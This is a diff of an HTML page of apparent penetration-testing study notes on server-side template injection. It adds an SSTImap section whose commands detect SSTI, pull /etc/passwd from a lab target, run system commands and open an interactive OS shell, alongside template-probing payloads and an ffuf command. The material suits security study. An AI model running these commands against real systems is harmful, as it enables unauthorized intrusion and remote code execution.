@@ -805,6 +805,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#sstimap" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSTImap
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1497,6 +1506,15 @@
   
 </li>
         
+          <li class="md-nav__item">
+  <a href="#sstimap" class="md-nav__link">
+    <span class="md-ellipsis">
+      SSTImap
+    </span>
+  </a>
+  
+</li>
+        
       </ul>
     </nav>
   
@@ -1659,7 +1677,7 @@ ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-
 <li>Follow the below tree looking to find when payload is executed successfully i.e. 7*7 returns 49.</li>
 <li>{{7*'7'}} will be 7777777 in Jinja, while in Twig, the result will be 49.</li>
 </ul>
-<p><img alt="Identifying Template Engine" src="..\images\identify-template.png" /></p>
+<p><img alt="Identifying Template Engine" src="../../images/identify-template.png" /></p>
 <h3 id="jingapython">Jinga(python)</h3>
 <table>
 <thead>
@@ -1711,6 +1729,20 @@ ffuf -w ./ports.txt -u http://10.129.201.127/index.php -X POST -H &quot;Content-
 </tbody>
 </table>
 <p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">Payload all the things cheat sheet for other templates</a></p>
+<h3 id="sstimap">SSTImap</h3>
+<ul>
+<li>For identifying and exploiting SSTI attacks</li>
+<li>https://github.com/vladko312/SSTImap</li>
+</ul>
+<pre><code class="language-bash">git clone https://github.com/vladko312/SSTImap
+cd SSTImap
+pip3 install -r requirements.txt
+python3 sstimap.py
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test # Provide target URL to identify SSTI
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test -D '/etc/passwd' './passwd' # Download remote file to local machine
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test -S id # Execute system commands
+python3 sstimap.py -u http://172.17.0.2/index.php?name=test --os-shell # Obtain interactive shell
+</code></pre>
 <h2 id="ssi-injection-directives">SSI Injection - Directives</h2>
 <table>
 <thead>
